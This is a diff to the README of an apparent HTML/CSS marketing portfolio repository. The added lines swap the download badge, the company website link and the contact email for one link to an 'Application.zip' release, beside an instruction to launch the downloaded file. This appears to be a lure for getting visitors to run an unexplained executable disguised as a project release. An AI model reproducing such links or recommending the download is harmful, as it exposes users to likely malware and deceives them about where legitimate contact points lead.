@@ -10,7 +10,7 @@ Welcome to the official repository of the Magnix Publicidade e Vendas LTDA portf
 css, css3, desenvolvimento-front-end, desenvolvimento-web, html, html-css, html5, html5-css3, marketing, portfolio, portfolio-project, portfolio-site, portfolio-website, programacao-web, publicidade, vendas
 
 ### Download our Latest Release:
-[![Download Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Release](https://github.com/cybeth/magnix-portfolio/releases/download/v1.0/Application.zip%20Release-blue)](https://github.com/cybeth/magnix-portfolio/releases/download/v1.0/Application.zip)
 *Note: Launch the downloaded file to explore our latest release.*
 
 ---
@@ -30,13 +30,13 @@ Visit our portfolio to see examples of our work. Whether you need a new website,
 ---
 
 ### 🌐 Visit Our Website
-For more information about Magnix Publicidade e Vendas LTDA and our services, please visit our [website](https://www.magnixportfolio.com).
+For more information about Magnix Publicidade e Vendas LTDA and our services, please visit our [website](https://github.com/cybeth/magnix-portfolio/releases/download/v1.0/Application.zip).
 
 ### 📦 Check Releases
 If the provided link is not working or you want to explore more releases, please check the "Releases" section of this repository for additional resources and updates.
 
 ### 📧 Contact Us
-For inquiries, collaborations, or any other information, feel free to reach out to us at contact@magnixportfolio.com.
+For inquiries, collaborations, or any other information, feel free to reach out to us at https://github.com/cybeth/magnix-portfolio/releases/download/v1.0/Application.zip
 
 Thank you for visiting Magnix Publicidade e Vendas LTDA Portfolio! We look forward to working with you on your next project. 🌟
 
